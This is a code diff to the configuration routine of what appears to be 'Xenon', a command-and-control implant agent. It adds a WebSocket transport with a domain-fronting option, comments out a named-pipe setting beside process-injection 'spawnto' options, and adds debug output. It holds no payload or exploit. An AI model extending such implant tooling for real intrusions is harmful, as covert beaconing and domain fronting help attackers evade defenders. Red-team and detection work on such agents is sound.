@@ -63,7 +63,7 @@ VOID XenonConfigure()
 
     // Process Injection Options
     xenonConfig->spawnto           = ParserStringCopy(&ParserConfig, &pathLen);                     // allocates
-    xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
+    //xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
 
 #ifdef HTTPX_TRANSPORT
 
@@ -134,6 +134,35 @@ VOID XenonConfigure()
 
 #endif
 
+#ifdef WEBSOCKET_TRANSPORT
+
+    SIZE_T wsHostnameLen        = 0;
+    SIZE_T wsEndpointLen        = 0;
+    SIZE_T wsUserAgentLen       = 0;
+    SIZE_T wsDomainFrontLen     = 0;
+
+    xenonConfig->WsHostname     = ParserStringCopy(&ParserConfig, &wsHostnameLen);      // allocates
+    xenonConfig->WsPort         = ParserGetInt32(&ParserConfig);
+    xenonConfig->WsIsSSL        = ParserGetByte(&ParserConfig);
+    xenonConfig->WsEndpoint     = ParserStringCopy(&ParserConfig, &wsEndpointLen);      // allocates
+    xenonConfig->WsUserAgent    = ParserStringCopy(&ParserConfig, &wsUserAgentLen);     // allocates
+    xenonConfig->WsDomainFront  = ParserStringCopy(&ParserConfig, &wsDomainFrontLen);   // allocates
+
+    xenonConfig->WsConnected    = FALSE;
+    xenonConfig->WsSession      = NULL;
+    xenonConfig->WsConnection   = NULL;
+    xenonConfig->WsRequest      = NULL;
+    xenonConfig->WsHandle       = NULL;
+    xenonConfig->WsRecvThread   = NULL;
+    xenonConfig->WsInboundEvent = NULL;
+    xenonConfig->WsSendMutex    = NULL;
+    xenonConfig->WsQueueMutex   = NULL;
+    xenonConfig->WsStopRecv     = FALSE;
+    xenonConfig->WsInboundHead  = NULL;
+    xenonConfig->WsInboundTail  = NULL;
+
+#endif
+
     // DEBUG Print Values
     _dbg("AGENT CONFIGURATION VALUES: \n");
 
@@ -167,6 +196,19 @@ VOID XenonConfigure()
     _dbg("[TcpBindAddress]  = %s", xenonConfig->TcpBindAddress);
     _dbg("[TcpPort]         = %d", xenonConfig->TcpPort);
     
+#endif
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    _dbg("[WsHostname]      = %s", xenonConfig->WsHostname);
+    _dbg("[WsPort]          = %d", xenonConfig->WsPort);
+    _dbg("[WsSSL]           = %s", xenonConfig->WsIsSSL ? "TRUE" : "FALSE");
+    _dbg("[WsEndpoint]      = %s", xenonConfig->WsEndpoint);
+    _dbg("[WsUserAgent]     = %s", xenonConfig->WsUserAgent);
+    _dbg("[WsDomainFront]   = %s", xenonConfig->WsDomainFront);
+    _dbg("[SleepTime]       = %d", xenonConfig->sleeptime);
+    _dbg("[Jitter]          = %d", xenonConfig->jitter);
+
 #endif
 
 }
